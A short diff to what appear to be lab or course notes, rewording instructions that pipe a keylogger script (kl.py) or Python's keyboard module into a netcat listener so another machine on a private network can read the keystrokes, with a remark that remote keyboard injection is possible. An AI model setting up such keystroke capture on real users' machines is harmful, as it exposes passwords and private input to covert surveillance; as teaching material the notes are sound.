@@ -29,15 +29,13 @@ Command line extension activities:
   ```
   python3 kl.py | nc -lkv 7777
   ```
-  or
   ```
   python -m keyboard | nc -lkv 7777
   ```
-  * Client (ex: 10.2.0.6):
+  * Client (ex: 10.2.0.6; or, use a browser):
   ```  
   nc -zv 10.2.0.5 7777
   ```
-  or, use a browser.
 Note:  Remote keyboard injection is also possible with the keyboard module.
 
 ## Helpful Libraries and Links
